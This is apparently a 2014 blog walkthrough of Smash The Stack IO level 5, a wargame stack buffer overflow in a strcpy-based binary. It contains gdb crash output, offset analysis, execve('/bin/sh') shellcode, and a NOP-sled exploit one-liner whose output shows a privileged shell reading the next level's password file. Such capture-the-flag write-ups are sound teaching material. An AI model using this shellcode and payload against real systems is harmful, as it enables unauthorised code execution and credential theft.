---
title: "Smash The Stack: IO Level 5 Walkthrough"
date: 2014-12-03T13:59:04+00:00
url: "/smash-the-stack-level-5/"
draft: false
description: "A walkthrough of Level 5 on Smash The Stack IO, developing a classic stack-based buffer overflow exploit with shellcode and NOP sled."
categories: ["Bash", "exploit-dev", "Linux", "Security"]
tags: ["smashthestack", "wargame", "buffer-overflow", "shellcode", "stack-smashing"]
---

Level 5 of the Smash The Stack IO wargame presents a classic stack-based buffer overflow scenario.

Executing the binary simply echoes the supplied command-line argument:

```bash
level5@io:/levels$ ./level05 test
test
```

### Analyzing the Source Code

The source file `level05.c` shows an unbounded `strcpy` into a fixed 128-byte stack buffer:

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char buf[128];

    if (argc < 2) return 1;

    strcpy(buf, argv[1]);
    printf("%s\n", buf);

    return 0;
}
```

Because `strcpy()` copies until it hits a null byte without checking the destination bounds of `buf[128]`, an argument exceeding 128 bytes overwrites adjacent stack data, including the saved base pointer (`EBP`) and return address (`EIP`).

### Fuzzing and Register Control

Passing a 144-byte string crashes the application:

```bash
level5@io:/levels$ gdb -q ./level05
(gdb) r $(python -c "print 'A' * 144")
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

`EIP` is overwritten with `0x41414141` (`AAAA`), confirming total control over the instruction pointer.

### Stack Layout and Shellcode Selection

Examining the disassembly of `main`:

```x86asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x080483b4 <+0>:     push   %ebp
   0x080483b5 <+1>:     mov    %esp,%ebp
   0x080483b7 <+3>:     sub    $0xa8,%esp
   ...
   0x080483e5 <+49>:    lea    -0x88(%ebp),%eax
   0x080483eb <+55>:    mov    %eax,(%esp)
   0x080483ee <+58>:    call   0x80482d4 <strcpy@plt>
```

- `buf` begins at `-0x88(%ebp)` (136 bytes from saved `EBP`).
- Saved `EBP` takes 4 bytes.
- Total offset to return address (`EIP`): `136 + 4 = 140 bytes`.

We can use a standard 23-byte x86 Linux `execve("/bin/sh")` shellcode:

```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Exploit Payload Structure

To ensure reliable execution, we assemble:
1. **NOP Sled (`\x90`)**: 117 bytes.
2. **Shellcode**: 23 bytes (117 + 23 = 140 bytes to align with saved return address).
3. **Target Return Address**: Pointing into our NOP sled on the stack (approx. `0xbffffde8`).

### Execution

Because environment variables and stack offsets vary slightly between running under GDB versus direct shell execution, adjusting the target return address into the middle of the NOP sled guarantees a hit:

```bash
level5@io:/levels$ ./level05 $(python -c "print '\x90' * 117 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xe8\xfd\xff\xbf'")
sh-4.2$ whoami
level6
sh-4.2$ cat /home/level6/.pass
rXCikld0ex3EQsnI
```

We land inside the NOP sled, slide into the shellcode, and obtain our `level6` shell.
